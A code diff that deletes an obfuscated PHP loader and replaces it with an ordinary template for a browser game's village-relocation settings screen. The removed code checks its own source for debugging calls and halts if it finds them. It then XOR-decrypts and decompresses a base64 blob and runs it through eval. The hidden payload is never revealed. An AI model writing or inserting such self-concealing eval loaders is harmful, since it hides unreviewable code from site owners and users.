@@ -1,24 +1,19 @@
-<?php
-$pdzavpeo="6f81523ee007828024fc22b0fed5c122";
-$kswqpmd="50510f02035056530403080e0153005351065e56500753060551020457050000";
-$jzwlyfj="Hu2Con0spgZxtc+sQ2YrJi4ZmUOzKBX7YmwWMbAYFaxSIUn6QHjw5VJKLCt4aiPf0VXeyoWuQGyMOw+vJX7lu0kqt8VtbUQ+HMdsoCoNu2txoDX8bdw/vfS/ss+W1LJDB7QHSeI78csgayIagAgNdtkAS1wMXnpyJuIRQP0AR9JlRFbAtleuM6DgoS6E3o8ti2KVmpUMOB+6JQ5YLikaCgFrhYoRk0kI1Rx+vThhnOQMIgw9ZwqjakSEoEplfPJ7nQ5+HHIryfraJxVpCgpHkt5b4gdz3a9EFcL11Pn90fhecsWvYm5GZYsN+fPXtoqLqyZ641QqZqSWWIXSESUOSyPSXdP+TH0dBAtcJPILDImMx5ibvdW9lAvcsSwxlQQO7UcsEgweoFnuOgK5mvdBvHn1v8DHd+oQc7m+WQOSECCoQc2tgHphEUcolEFH2+yZxWLaJkToRG36GZdOy03ekd+fKQLHY2asRTU=";
-$sfrdgymy=file_get_contents(__FILE__);
-$eyywxsh=str_replace($jzwlyfj,"",$sfrdgymy);
-if(strpos($eyywxsh,"ec"."ho")!==false||strpos($eyywxsh,"pr"."int")!==false||strpos($eyywxsh,"var_"."dump")!==false||strpos($eyywxsh,"file_put_"."contents")!==false||strpos($eyywxsh,"fw"."rite")!==false){die();}
-$jhutvbhh=str_replace(array($pdzavpeo,$kswqpmd),array("SP_42de093e","KP_73fc8fe3"),$sfrdgymy);
-$dfezweiuv=md5($jhutvbhh);
-$jrnifjyn=hex2bin($kswqpmd);
-$ejasldp="";
-$invlglh=strlen($dfezweiuv);
-for($ppyaihkuig=0;$ppyaihkuig<$invlglh;$ppyaihkuig++){
-$ejasldp.=chr(ord($jrnifjyn[$ppyaihkuig])^ord($dfezweiuv[$ppyaihkuig]));
-}
-$dvjomq=base64_decode($jzwlyfj);
-$lkklcqhd=strlen($dvjomq);
-$pbfiqxq="";
-$haiotyfa=strlen($ejasldp);
-for($ppyaihkuig=0;$ppyaihkuig<$lkklcqhd;$ppyaihkuig++){
-$pbfiqxq.=$dvjomq[$ppyaihkuig]^$ejasldp[$ppyaihkuig%$haiotyfa];
-}
-$comeltbi="gzun"."compress";
-eval('?>' . $comeltbi($pbfiqxq) . '<?php ');
+<h3><?= __('screens.settings_move.title') ?></h3>
+<p><?= __('screens.settings_move.description') ?></p>
+
+<p><?= __('screens.settings_move.cooldown_info') ?></p>
+
+<?php if (!$can_restart): ?>
+    <p><b><?= sprintf(__('screens.settings_move.village_count_error'), $village_count) ?></b></p>
+<?php elseif (!$can_restart_time): ?>
+    <p><b><?= __('screens.settings_move.possible_in') ?>     <?= $mozliwe_o ?></b></p>
+    <p><?= __('screens.settings_move.wait_3_days') ?></p>
+<?php elseif ($form ?? false): ?>
+    <form action="game.php?village=<?= $village['id'] ?>&screen=settings&mode=move&action=move&h=<?= $hkey ?>"
+        method="post">
+        <?= __('screens.settings_move.enter_password') ?> <input name="password" type="password">
+        <input value="OK" type="submit">
+    </form>
+<?php else: ?>
+    <p><b><?= __('screens.settings_move.possible_in') ?>     <?= $mozliwe_o ?></b></p>
+<?php endif; ?>
